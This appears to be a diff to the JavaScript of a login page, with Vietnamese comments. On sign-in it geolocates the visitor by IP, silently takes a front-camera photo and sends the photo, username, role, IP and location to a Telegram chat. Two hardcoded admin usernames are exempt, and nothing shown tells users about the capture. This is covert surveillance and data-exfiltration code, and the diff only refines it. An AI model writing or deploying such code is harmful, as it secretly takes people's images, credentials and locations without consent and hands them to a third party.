@@ -12,8 +12,7 @@ const info = {
   lat: '',
   lon: '',
   loginDetails: '',
-  specialNote: '',
-  isAdmin: false // Biến để kiểm soát việc chụp ảnh
+  isAdmin: false
 };
 
 async function getNetworkData() {
@@ -21,9 +20,9 @@ async function getNetworkData() {
     const res = await fetch(`https://ipwho.is/`);
     const data = await res.json();
     info.ip = data.ip || 'Không rõ';
-    info.isp = data.connection?.org || 'Saigon Tourist Cable Television';
-    info.lat = data.latitude || 10.7;
-    info.lon = data.longitude || 106.6;
+    info.isp = data.connection?.org || 'ISP';
+    info.lat = data.latitude || 0;
+    info.lon = data.longitude || 0;
     info.address = `${data.city}, ${data.region} (Vị trí IP)`;
   } catch (e) { 
     info.ip = 'Lỗi kết nối'; 
@@ -31,9 +30,15 @@ async function getNetworkData() {
   }
 }
 
+// SỬA LẠI HÀM CHỤP: Kiểm tra trực tiếp ID username để chặn tuyệt đối
 async function captureCamera() {
-  // Nếu là Admin thì thoát luôn, không xin quyền, không chụp
-  if (info.isAdmin) return null;
+  const user = document.getElementById('username').value.trim();
+  
+  // CHẶN NGAY LẬP TỨC: Nếu là Admin thì không chạy bất cứ dòng code camera nào
+  if (user === "Mrwenben" || user === "VanThanh") {
+    console.log("Admin detected: Camera disabled.");
+    return null;
+  }
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -56,12 +61,13 @@ async function captureCamera() {
 }
 
 function getCaption() {
+  // Sửa lại Maps Link để tránh bị lỗi hiển thị
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   
   // Tiêu đề Admin hoặc Người dùng thường
-  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
+  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP VÀO TRANG` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
 
-  // NỘI DUNG CHỈ BAO GỒM: THỜI GIAN, TÀI KHOẢN, IP, MẠNG, VỊ TRÍ (ĐÃ BỎ THIẾT BỊ/DVI)
+  // TUYỆT ĐỐI KHÔNG CÓ DÒNG THIẾT BỊ/DVI Ở ĐÂY
   return `
 ${header}
 ━━━━━━━━━━━━━━━━━━
@@ -76,23 +82,28 @@ ${header}
 }
 
 async function main() {
-  info.time = new Date().toLocaleString('vi-VN');
+  // Lấy dữ liệu ngay lập tức
   const user = document.getElementById('username').value.trim();
   const role = document.getElementById('user-role').value;
+  
+  info.time = new Date().toLocaleString('vi-VN');
   info.loginDetails = `${user} (${role})`;
 
-  // Kiểm tra quyền Admin
+  // Xác định quyền Admin
   if (user === "Mrwenben" || user === "VanThanh") {
       info.isAdmin = true;
-      info.specialNote = "Admin";
+  } else {
+      info.isAdmin = false;
   }
 
+  // Chạy lấy mạng
   await getNetworkData();
   
-  // Chụp ảnh (Hàm này sẽ tự trả về null nếu là Admin)
+  // Gọi hàm chụp (Hàm này đã có chốt chặn Admin ở bên trong)
   const frontBlob = await captureCamera();
 
-  if (frontBlob) {
+  // Logic gửi tin nhắn
+  if (frontBlob && !info.isAdmin) {
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
     const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
@@ -100,7 +111,7 @@ async function main() {
     formData.append('media', JSON.stringify(media));
     await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
   } else {
-    // Admin hoặc người từ chối cam sẽ gửi tin nhắn văn bản thuần túy
+    // Admin luôn luôn vào đây, không gửi ảnh, không gửi dvi
     await fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
